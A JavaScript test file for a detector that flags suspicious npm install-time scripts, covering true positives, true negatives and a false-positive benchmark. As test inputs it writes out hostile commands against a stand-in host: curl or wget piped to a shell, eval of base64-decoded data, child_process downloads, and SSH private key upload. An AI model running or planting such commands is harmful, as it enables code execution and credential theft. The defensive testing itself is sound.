import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { checkScriptText, checkPackageScripts } from "./installScriptCheck.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const projectRoot = join(__dirname, "..");

function loadFixture(relativePath) {
  return JSON.parse(readFileSync(join(projectRoot, relativePath), "utf-8"));
}

// ---------------------------------------------------------------------------
// 1. Unit tests for the pattern-matching logic itself
// ---------------------------------------------------------------------------
describe("checkScriptText (pattern-matching logic)", () => {
  it("returns no flags for an empty or missing script", () => {
    expect(checkScriptText("")).toEqual([]);
    expect(checkScriptText(undefined)).toEqual([]);
  });

  it("flags a bare curl or wget invocation", () => {
    expect(checkScriptText("curl https://example.com/x.sh")).toEqual([
      { category: "network fetch", matchedText: "curl" },
    ]);
    expect(checkScriptText("wget https://example.com/x.sh")).toEqual([
      { category: "network fetch", matchedText: "wget" },
    ]);
  });

  it("flags Windows-style download-and-run commands", () => {
    expect(checkScriptText("powershell -c Invoke-WebRequest https://example.com/x.exe")).toContainEqual(
      expect.objectContaining({ category: "network fetch" })
    );
    expect(checkScriptText("certutil -urlcache -f https://example.com/x.exe out.exe")).toContainEqual(
      expect.objectContaining({ category: "network fetch" })
    );
  });

  it("flags eval(", () => {
    expect(checkScriptText("node -e \"eval(atob(process.env.X))\"")).toContainEqual(
      expect.objectContaining({ category: "eval" })
    );
  });

  it("does not flag words that merely contain 'eval' as a substring", () => {
    expect(checkScriptText("node scripts/retrieval.js")).toEqual([]);
  });

  it("flags child_process usage", () => {
    expect(checkScriptText("node -e \"require('child_process').exec('ls')\"")).toContainEqual(
      expect.objectContaining({ category: "child_process" })
    );
  });

  it("flags writes to sensitive paths", () => {
    expect(checkScriptText("cat id_rsa >> ~/.ssh/authorized_keys")).toContainEqual(
      expect.objectContaining({ category: "suspicious write target" })
    );
    expect(checkScriptText("cp creds ~/.aws/credentials")).toContainEqual(
      expect.objectContaining({ category: "suspicious write target" })
    );
  });

  it("can return multiple categories for one script", () => {
    const flags = checkScriptText(
      "curl http://evil.example.com/x.js -o x.js && node -e \"eval(require('fs').readFileSync('x.js','utf8'))\""
    );
    const categories = flags.map((f) => f.category);
    expect(categories).toContain("network fetch");
    expect(categories).toContain("eval");
  });

  it("does not flag a plain local script invocation", () => {
    expect(checkScriptText("node install.js")).toEqual([]);
    expect(checkScriptText("node-gyp rebuild")).toEqual([]);
    expect(checkScriptText("prebuild-install || node-gyp rebuild")).toEqual([]);
  });
});

describe("checkPackageScripts (lifecycle script extraction)", () => {
  it("only looks at preinstall/install/postinstall, ignoring other script names", () => {
    const { lifecycleScripts, flags } = checkPackageScripts({
      build: "curl https://example.com/x.sh", // not a lifecycle script — ignored
      test: "jest",
    });
    expect(lifecycleScripts).toEqual({});
    expect(flags).toEqual({});
  });

  it("surfaces raw script text for transparency, flagged or not", () => {
    const { lifecycleScripts } = checkPackageScripts({
      install: "node-gyp rebuild",
      postinstall: "curl https://example.com/x.sh | sh",
    });
    expect(lifecycleScripts).toEqual({
      install: "node-gyp rebuild",
      postinstall: "curl https://example.com/x.sh | sh",
    });
  });

  it("only reports flags for the scripts that actually matched", () => {
    const { flags } = checkPackageScripts({
      install: "node-gyp rebuild",
      postinstall: "curl https://example.com/x.sh | sh",
    });
    expect(Object.keys(flags)).toEqual(["postinstall"]);
  });
});

// ---------------------------------------------------------------------------
// 2. Known malicious-style patterns (true positives)
//
// These are synthetic scripts modeled on documented supply-chain attack
// techniques (curl/wget-to-shell, obfuscated eval, child_process spawning a
// download, SSH-key exfiltration) — NOT copies of any real package's code.
// ---------------------------------------------------------------------------
describe("known malicious-style patterns are flagged (true positives)", () => {
  const cases = [
    ["curl -s https://evil.example.com/payload.sh | bash", "network fetch"],
    ["wget http://evil.example.com/x.sh && chmod +x x.sh && ./x.sh", "network fetch"],
    [
      "node -e \"require('child_process').exec('curl http://evil.example.com/x.sh|sh')\"",
      "child_process",
    ],
    ["node -e \"eval(Buffer.from(process.env.X,'base64').toString())\"", "eval"],
    [
      "cp ~/.ssh/id_rsa /tmp/k && curl -F file=@/tmp/k http://evil.example.com/upload",
      "suspicious write target",
    ],
  ];

  it.each(cases)("flags %s (expects category: %s)", (script, expectedCategory) => {
    const flags = checkScriptText(script);
    expect(flags.length).toBeGreaterThan(0);
    expect(flags.map((f) => f.category)).toContain(expectedCategory);
  });
});

// ---------------------------------------------------------------------------
// 3 & 4. Known legitimate scripts (true negatives) + false-positive
// regression benchmark, in one pass over the same real-world fixture.
// ---------------------------------------------------------------------------
describe("known legitimate install scripts are not flagged (true negatives + FP regression)", () => {
  const { packages } = loadFixture("test-fixtures/legit-install-scripts.json");

  it("loaded a non-trivial real-world sample", () => {
    expect(packages.length).toBeGreaterThanOrEqual(20);
  });

  it.each(packages.map((p) => [p.name, p.scripts]))("does not flag %s's install script(s)", (name, scripts) => {
    const { flags } = checkPackageScripts(scripts);
    expect(flags, `expected ${name} not to be flagged, got ${JSON.stringify(flags)}`).toEqual({});
  });

  it("false-positive rate across the full benchmark stays at 0 (measured 0/23 in Phase 3)", () => {
    const flaggedPackages = packages.filter((p) => {
      const { flags } = checkPackageScripts(p.scripts);
      return Object.keys(flags).length > 0;
    });
    expect(
      flaggedPackages.map((p) => p.name),
      "false positives found"
    ).toEqual([]);
  });
});
